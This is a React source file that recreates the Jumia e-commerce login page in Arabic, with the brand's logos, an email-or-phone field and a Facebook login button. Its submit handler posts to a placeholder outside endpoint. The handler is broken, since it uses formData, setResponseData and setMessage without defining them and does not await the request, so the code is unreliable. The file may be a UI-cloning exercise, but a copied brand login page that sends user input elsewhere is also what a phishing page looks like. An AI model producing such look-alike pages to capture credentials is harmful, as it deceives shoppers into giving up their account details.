// JumiaLogin.jsx
import React, { useState } from "react";
import "./login.css"; 
import axios from 'axios';
import { useNavigate } from "react-router-dom";
export default function Login() {
  const [emailOrPhone, setEmailOrPhone] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    try {
      const response =  axios.post('https://your-api.com/contact', formData);
      
      // استلام البيانات من الرد
      setResponseData(response.data);
      setMessage('تم الإرسال بنجاح!');
    } catch (error) {
      console.error(error);
      setMessage('حدث خطأ أثناء الإرسال');
    }
    
   
  };

  return (
    <div className="login-container">
      <div className="login-box">
      <img className="logo" alt="jumia logo" src="/myjumia-top-logo.png" id="myjumia-top-logo"></img>
        <h2>مرحبًا بكم في Jumia</h2>
        <p>اكتب بريدك الإلكتروني أو رقم هاتفك لتسجيل الدخول أو إنشاء حساب على Jumia</p>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="عنوان البريد الإلكتروني أو رقم الهاتف*"
            value={emailOrPhone}
            onChange={(e) => setEmailOrPhone(e.target.value)}
            required
          />
          <button type="submit" className="continue-btn">استمرار</button>
        </form>
        <p className="terms">
          من خلال الاستمرار، فإنك توافق على <a href="#">الشروط والأحكام</a>
        </p>
        <button className="facebook-btn">تسجيل الدخول باستخدام الفيسبوك</button>
        <p className="footer">لمزيد من الدعم، يمكنك زيارة مركز المساعدة أو الاتصال بخدمة العملاء.</p>
        <img src="/myjumia-bottom-logo.png" alt="bottomLogo" id="myjumia-bottom-logo"></img>
      </div>
    </div>
  );
}
